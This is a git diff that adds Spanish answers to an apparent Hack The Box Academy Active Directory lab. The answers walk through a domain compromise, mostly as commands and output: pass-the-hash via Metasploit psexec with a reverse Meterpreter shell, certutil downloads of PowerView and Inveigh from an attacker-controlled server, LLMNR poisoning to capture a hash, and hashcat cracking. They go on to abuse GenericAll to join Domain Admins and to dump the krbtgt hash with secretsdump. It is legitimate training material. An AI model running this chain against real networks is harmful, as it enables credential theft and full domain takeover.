@@ -396,21 +396,186 @@ evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
 > **Respuesta**: exc3ss1ve_adm1n_r1ights!
 ##### 9. _Obtén credenciales para un usuario que tenga derechos GenericAll sobre el grupo Domain Admins. ¿Cuál es el nombre de cuenta de este usuario?_
 
+Nos subimos PowerView.ps1 a la máquina en la que tenemos acceso con Evil-WinRM. El flujo es igual que antes: Kali -> Parrot -> Máquina Windows. Una vez tengamos el servidor Python en la Parrot corriendo, desde la sesión con Evil-WinRM:
 
+```powershell
+certutil.exe -urlcache -f http://172.16.7.240:8000/PowerView.ps1 .\PowerView.ps1
+Import-Module .\PowerView.ps1
+```
 
-> **Respuesta**: 
+Obtenemos el SID del administrador de dominio:
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ConvertTo-Sid "Domain Admins"
+S-1-5-21-3327542485-274640656-2609762496-512
+```
+
+Sin embargo, si intentamos enumerar los ACLs de esta máquina, nos encontraremos con errores. 
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
+[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest
+    + CategoryInfo          : OperationStopped: ([Get-DomainGUID...from Get-Forest:String) [], RuntimeException
+    + FullyQualifiedErrorId : [Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest
+```
+
+Por tanto, usaremos una sesión Meterpreter desde otra sesión con Parrot:
+
+```bash
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set LHOST 172.16.7.240
+msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.7.50
+msf6 exploit(windows/smb/psexec) > set smbuser administrator
+msf6 exploit(windows/smb/psexec) > set smbpass 00000000000000000000000000000000:bdaffbfe64f1fc646a3353be1c2c3c99
+msf6 exploit(windows/smb/psexec) > exploit
+
+# El formato `00000000....:hash` es simplemente **Pass-the-Hash** indicando:
+
+- "No tengo/No uso el LM Hash antiguo (por eso ceros)"
+- "Usa solo el NTLM Hash moderno para autenticar"
+
+[*] Started reverse TCP handler on 172.16.7.240:4444 
+[*] 172.16.7.50:445 - Connecting to the server...
+[*] 172.16.7.50:445 - Authenticating to 172.16.7.50:445 as user 'administrator'...
+[*] 172.16.7.50:445 - Selecting PowerShell target
+[*] 172.16.7.50:445 - Executing the payload...
+[+] 172.16.7.50:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 172.16.7.50
+[*] Meterpreter session 1 opened (172.16.7.240:4444 -> 172.16.7.50:49728 ) at 2025-12-23 10:03:22 -0500
+
+meterpreter > load powershell
+meterpreter > powershell_shell
+```
+
+Desde la sesión powershell de meterpreter importamos el módulo `PowerView.ps1` y continuamos.
+
+```powershell
+PS > Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
+```
+
+Nos dará múltiples ACLs. Filtramos por _GenericAll_ con `Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}`
+
+![[Pasted image 20251223161309.png]]
+
+* **ObjectDN**: Nombre distinguido (Distinguished Name) del objeto sobre el cual se aplica el permiso. Formato LDAP que identifica la ubicación del objeto en el directorio. * 
+* **ObjectSID**: Security Identifier del objeto objetivo. Identificador único e inmutable del objeto sobre el cual se aplica el ACE. 
+* **ActiveDirectoryRights**: Tipo de permiso otorgado. Define qué acciones puede realizar el principal sobre el objeto (GenericAll, GenericWrite, WriteDacl, etc.). 
+* **BinaryLength**: Longitud del ACE en bytes cuando se almacena en formato binario. 
+* **AceQualifier**: Indica si el ACE otorga o deniega permisos. Valores: `AccessAllowed` (concede) o `AccessDenied` (deniega). 
+* **IsCallback**: Indica si el ACE requiere evaluación condicional adicional mediante callback. `False` = ACE estándar, `True` = ACE condicional. 
+* **OpaqueLength**: Longitud de datos opacos adicionales específicos de aplicación. Generalmente 0 (sin datos adicionales). 
+* **AccessMask**: Representación numérica binaria de los permisos. Cada bit representa un permiso específico que Active Directory usa internamente. 
+* **SecurityIdentifier**: SID del principal (usuario/grupo) que tiene el permiso. Identifica QUIÉN tiene el derecho sobre el objeto objetivo. 
+* **AceType**: Clasificación específica del tipo de ACE. Generalmente coincide con AceQualifier (AccessAllowed, AccessDenied, etc.). 
+* **AceFlags**: Flags que controlan cómo se hereda el ACE a objetos hijos. Valores: `None`, `ContainerInherit`, `ObjectInherit`, `InheritOnly`. 
+* **IsInherited**: Indica si el permiso fue heredado de un objeto padre (`True`) o configurado directamente en este objeto (`False`). 
+* **InheritanceFlags**: Define cómo se heredan los permisos a objetos descendientes. Mismo concepto que AceFlags en diferente representación. 
+* **PropagationFlags**: Controla cómo se propaga la herencia a través de la jerarquía. Valores: `None` (propagación normal), `NoPropagateInherit`, `InheritOnly`. 
+* **AuditFlags**: Configuración de auditoría para este ACE. Valores: `None` (sin auditoría), `Success` (auditar accesos exitosos), `Failure` (auditar fallos).
+
+De ahí vemos dos SIDs. Nos sirve el primero porque: 
+1. **Empieza con `S-1-5-21-`** → Identifica un usuario/grupo del dominio (explotable) 
+2. **El segundo es `S-1-5-18`** → Es NT AUTHORITY\SYSTEM (cuenta built-in, no explotable) 
+3. **Solo los SIDs de dominio (`S-1-5-21-*`) representan usuarios reales** de los que podemos obtener credenciales 
+4. **Las cuentas built-in (`S-1-5-18`, `S-1-5-19`, `S-1-5-32-*`) no son vectores de ataque** válidos en pentesting Por tanto, el SID `S-1-5-21-3327542485-274640656-2609762496-4611` (CT059) es el objetivo a comprometer.
+
+- `S-1-5-21-...-512` = Domain Admins 
+- `S-1-5-21-...-RID` = Usuarios del dominio ✅ 
+- `S-1-5-18` = SYSTEM (ignorar) ❌ 
+- `S-1-5-19` = LOCAL SERVICE (ignorar) ❌ 
+- `S-1-5-32-*` = Built-in groups (ignorar) ❌
+
+```powershell
+PS > Convert-SidtoName "S-1-5-21-3327542485-274640656-2609762496-4611"    
+INLANEFREIGHT\CT059
+```
+
+> **Respuesta**: CT059
 ##### 10. _Crackea el hash de contraseña de este usuario y envía la contraseña en texto claro como respuesta._
 
+Para resolver esto vamos a usar `Inveigh.ps1`. Lo descargamos en nuestro Kali, lo movemos a la Parrot y de ahí, a la máquina Windows. 
 
+```bash
+# Kali
+wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
 
-> **Respuesta**: 
+# Movemos como siempre con un servidor python... y en la sesión powershell con meterpreter:
+certutil.exe -urlcache -f http://172.16.7.240:8000/Inveigh.ps1 .\Inveigh.ps1
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -NBNS Y LLMNR Y -ConsoleOutput Y -FileOutput Y
+```
+
+Tras esperar un poco, obtendremos el hash:
+
+```bash
+CT059::INLANEFREIGHT:6F404933E4B53368:65A3A98A63C1A3DADF1B1CCE32C408CE:0101000000000000270F12852174DC010C50D36B15157DE80000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800270F12852174DC0106000400020000000800300030000000000000000000000000200000EDFFF126C16E0569EF61DBA7B04FAF04A2480539EEC06AA5E3245F4DD1C9A56C0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+```
+
+Y lo intentamos descifrar:
+
+```bash
+hashcat -m 5600 hash_CT059.hash /usr/share/wordlists/rockyou.txt
+```
+
+> **Respuesta**: charlie1
 ##### 11. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host DC01._
 
+El usuario **CT059** tiene permisos _GenericAll_. Por tanto, podemos proceder a añadir este usuario al grupo de Administradores de dominio e iniciar un ataque DCSync. Configuramos proxychains en la máquina Kali para enrutar el tráfico a través de un proxy SOCKS4 en el puerto 9050. De esta forma, podremos autenticarnos en la máquina **MS01** usando las credenciales del usuario **CT059**.
 
+```bash
+# Kali
+sudo nano /etc/proxychains.conf
 
-> **Respuesta**: 
+...SNIP...
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4  127.0.0.1 9050
+```
+
+Después, establecemos una conexión SSH y creamos un proxy SOCKS en el puerto local 9050:
+
+```bash
+# Kali
+ssh -D 9050 htb-student@10.129.147.191
+
+# Kali en una nueva sesión
+proxychains xfreerdp3 /v:172.16.7.50 /u:CT059 /p:charlie1 /d:inlanefreight.local /dynamic-resolution /drive:Shared,//home/kali/Escritorio/HTB/Academy/ActiveDirectory/Lab2
+```
+
+![[Pasted image 20251223165117.png]]
+
+Procedemos a añadir esta cuenta al grupo de administradores de dominio.
+
+```powershell
+PS C:\Users\CT059> net group 'Domain Admins' ct059 /add /domain
+```
+
+Nos avisará de que se ha ejecutado con éxito el comando. Como ya somos administradores de dominio con este usuario, podemos lanzar una sesión nueva en DC01 (172.16.7.3):
+
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\CT059", (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
+Enter-PSSession -ComputerName DC01 -Credential $cred
+```
+
+![[Pasted image 20251223165408.png]]
+
+> **Respuesta**: acLs_f0r_th3_w1n!
 ##### 12. _Envía el hash NTLM para la cuenta KRBTGT del dominio objetivo después de lograr el compromiso del dominio._
 
+Desde la máquina Parrot, ejecutamos impacket-secretsdump:
 
+```bash
+impacket-secretsdump inlanefreight.local/CT059:charlie1@172.16.7.3 -just-dc-user krbtgt
+```
 
-> **Respuesta**: 
+![[Pasted image 20251223170624.png | 800]]
+
+**Campos:**
+- `krbtgt` - Nombre de usuario
+- `502` - RID (Relative ID) de la cuenta KRBTGT (siempre 502)
+- `aad3b435b51404eeaad3b435b51404ee` - LM Hash vacío/deshabilitado
+- `7eba70412d81c1cd030d72a3e8dbe05f` - **NTLM Hash** 
+
+> **Respuesta**: 7eba70412d81c1cd030d72a3e8dbe05f
